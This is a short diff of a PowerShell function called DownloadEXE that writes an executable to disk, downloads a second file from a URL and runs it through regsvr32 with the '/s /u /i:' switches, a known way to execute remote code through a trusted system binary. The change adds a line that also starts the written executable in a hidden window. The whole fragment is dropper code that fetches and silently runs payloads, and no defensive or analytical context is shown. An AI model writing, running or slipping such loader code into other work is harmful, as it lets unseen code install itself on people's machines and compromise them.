@@ -12,6 +12,7 @@ function DownloadEXE {
 	[System.IO.File]::WriteAllBytes($outFile, $bytes)
 
 	Invoke-WebRequest -Uri $Url -OutFile $outFile2
-
+	
+	Start-Process -FilePath $outFile -WindowStyle Hidden
 	Start-Process -FilePath "regsvr32.exe" -ArgumentList "/s /u /i:$outFile2" -WindowStyle Hidden
 }
